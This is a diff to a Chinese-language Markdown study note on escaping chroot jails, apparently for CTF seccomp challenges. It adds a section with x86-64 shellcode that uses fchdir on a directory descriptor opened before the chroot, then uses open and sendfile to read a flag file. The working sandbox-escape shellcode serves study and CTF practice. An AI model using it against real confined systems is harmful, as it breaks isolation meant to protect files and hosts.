@@ -14,6 +14,7 @@ comments: true
   - [2.1 利用chroot之前打开的目录/文件描述符实现逃逸](#21-利用chroot之前打开的目录文件描述符实现逃逸)
     - [2.1.1 只允许\["openat", "read", "write", "sendfile\] ](#211-只允许openat-read-write-sendfile-)
     - [2.1.2 只允许\["linkat", "open", "read", "write", "sendfile"\]](#212-只允许linkat-open-read-write-sendfile)
+    - [2.1.3 只允许\["fchdir", "open", "read", "write", "sendfile"\]](#213-只允许fchdir-open-read-write-sendfile)
 
 
 # 1. chroot 逃逸<br>
@@ -151,6 +152,39 @@ syscall
 
 mov rax, 2 # open
 lea rdi, [rip+test_path]  # path
+mov rsi, 0   # flags O_RDONLY
+mov rdx, 0  # 当指定O_CREAT时，设定文件的权限，这里就没意义
+syscall
+
+mov rdi, 1
+mov rsi, rax
+mov rdx, 0
+mov r10, 128
+mov rax, 40 # sendfile
+syscall
+file_path:
+.string "flag"
+test_path:
+.string "/test"
+```
+
+### 2.1.3 只允许["fchdir", "open", "read", "write", "sendfile"]<br>
+`fchdir`的作用与`chdir`类似用于改变当前工作目录,`fchdir`以文件描述符<br>
+```c
+int fchdir(int fd);
+fd： 你要修改的目录的描述符
+```
+实际shellcode如下:<br>
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+mov rax, 81 #fchdir
+mov rdi, 3 # assume opened dir fd = 3
+syscall
+
+mov rax, 2 # open
+lea rdi, [rip+file_path]  # path
 mov rsi, 0   # flags O_RDONLY
 mov rdx, 0  # 当指定O_CREAT时，设定文件的权限，这里就没意义
 syscall
